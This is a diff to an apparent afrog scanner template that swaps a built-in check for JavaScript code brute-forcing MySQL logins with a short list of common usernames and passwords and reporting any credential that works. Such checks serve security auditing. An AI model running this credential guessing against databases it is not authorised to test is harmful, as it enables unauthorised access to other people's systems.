@@ -6,7 +6,7 @@ info:
   severity: high
   verified: true
   description: |-
-    MySQL weak credentials were discovered (dictionary brute-force in go).
+    MySQL weak credentials were discovered (dictionary brute-force in javascript).
   tags: network,db,mysql,default-login,weak-login
   requires: [mysql]
   created: 2026/01/11
@@ -14,8 +14,44 @@ info:
 rules:
   r0:
     request:
-      type: go
-      data: mysql-weak-login
+      type: javascript
+      code: |
+        var mysql = require("afrog/mysql");
+
+        // 目标未带端口时回落到 3306，与 requires: [mysql] 的指纹端口保持一致
+        var port = /^[0-9]+$/.test(String(Port)) ? Port : "3306";
+
+        var usernames = ["root", "admin", "mysql", "test"];
+        var passwords = ["", "root", "123456", "12345678", "admin", "password", "mysql", "toor", "1qaz2wsx", "qwer1234", "000000", "111111", "123123"];
+
+        var tried = 0;
+        var result = "";
+
+        for (var i = 0; i < usernames.length && result === ""; i++) {
+          for (var j = 0; j < passwords.length; j++) {
+            tried++;
+            var c = mysql.MySQLClient();
+            c.SetTimeout(3);
+            if (!c.Connect(Host, port)) {
+              result = "fail;reason=connect_failed;tried=" + tried;
+              break;
+            }
+            var ok = c.Login(usernames[i], passwords[j]);
+            c.Close();
+            if (ok) {
+              result = "success;user=" + usernames[i] + ";pass=" + passwords[j];
+              break;
+            }
+          }
+        }
+
+        if (result === "") {
+          result = "fail;reason=not_found;tried=" + tried;
+        }
+        Export(result);
+      args:
+        Host: "{{Host}}"
+        Port: "{{Port}}"
     expression: response.raw.bcontains(b"success;")
     extractors:
       - type: regex
